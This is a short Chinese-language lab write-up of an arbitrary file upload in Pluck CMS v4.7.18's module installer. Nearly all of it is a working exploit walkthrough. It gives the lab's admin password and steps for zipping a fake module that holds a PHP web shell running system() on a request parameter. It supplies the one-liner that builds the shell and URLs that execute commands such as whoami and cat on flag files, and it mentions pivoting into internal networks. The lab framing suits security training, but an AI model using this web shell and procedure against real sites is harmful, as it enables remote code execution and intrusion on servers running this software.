验证漏洞存在方法
    - 登录Pluck CMS后台（默认密码admin123456）
    - 访问模块安装页面，尝试上传包含PHP文件的ZIP压缩包
    - 检查是否能够成功上传并解压到data/modules目录

漏洞利用方法
    - 这是一个发生在 Pluck CMS v4.7.18 模块安装功能中的任意文件上传漏洞。后台的模块安装入口允许已登录管理员上传扩展名包含 .zip 或 .tar.gz 的压缩包，并在服务器端直接将压缩包解压到 data/modules 目录下，但没有对压缩包内文件类型做有效限制，也没有阻止 PHP 脚本被写入 Web 可访问位置。攻击者只要拥有后台口令，就可以上传带有恶意 PHP 文件的伪造模块压缩包，使恶意代码落地到站点目录并被解释执行，最终获得远程代码执行能力。
    - 1. 先获取 Pluck CMS 后台口令。在该靶场中，管理员密码为 admin123456，登录入口是 /login.php 或 /admin.php。2. 登录后台后进入模块安装页面，对应管理动作是安装模块。3. 构造一个看起来像模块的 ZIP 压缩包，例如压缩包名为 shell.zip，内部目录为 shell/，目录中放入 shell.php 之类的恶意 PHP 文件。4. 通过模块上传表单提交该 ZIP。服务端会把压缩包先保存到 data/modules/shell.zip，再直接解压到 data/modules 目录，并删除原始 ZIP。5. 解压完成后，恶意文件将位于 data/modules/shell/shell.php 之类的位置。由于该目录处于 Web 根目录下且 PHP 可执行，攻击者可直接通过浏览器访问该脚本。6. 如果脚本支持命令执行参数，例如 cmd，那么访问 /data/modules/shell/shell.php?cmd=id 即可验证命令执行。7. 在靶场里可进一步读取 /tmp/flag.txt 和 /tmp/hint.txt，若该主机同时连接多个网络，还可继续作为跳板访问内网中的其他服务。
    - 下面给出一个最小化示范 PoC。先准备恶意模块目录 shell/，其中 shell.php 内容为：<?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);} ?>。然后执行：mkdir -p shell && printf '%s' "<?php if(isset(\$_REQUEST['cmd'])){system(\$_REQUEST['cmd']);} ?>" > shell/shell.php && zip -r shell.zip shell。上传 shell.zip 到后台模块安装页面后，直接访问 /data/modules/shell/shell.php?cmd=whoami 即可看到命令执行结果。若需要读取靶场文件，可访问 /data/modules/shell/shell.php?cmd=cat%20/tmp/flag.txt 或 /data/modules/shell/shell.php?cmd=cat%20/tmp/hint.txt。
